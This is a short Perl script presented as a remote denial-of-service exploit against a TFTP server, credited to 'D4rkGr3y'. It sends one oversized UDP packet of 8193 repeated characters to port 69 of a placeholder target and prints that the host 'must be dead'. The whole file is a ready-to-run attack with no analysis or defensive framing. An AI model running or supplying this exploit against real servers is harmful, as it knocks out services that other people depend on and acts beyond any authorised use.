#!/usr/bin/perl
#TFTP Server remote DoS exploit by D4rkGr3y
use IO::Socket;
$host = "vulnerable_host";
$port = "69";
$data = "q";
$num = "8193";
$buf .= $data x $num;
$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error: $@\n";
$ipaddr = inet_aton($host);
$portaddr = sockaddr_in($port, $ipaddr);
send($socket, $buf, 0, $portaddr) == length($buf) or die "Can't send: $!\n";
print "Now, '$host' must be dead :)\n";

#EOF
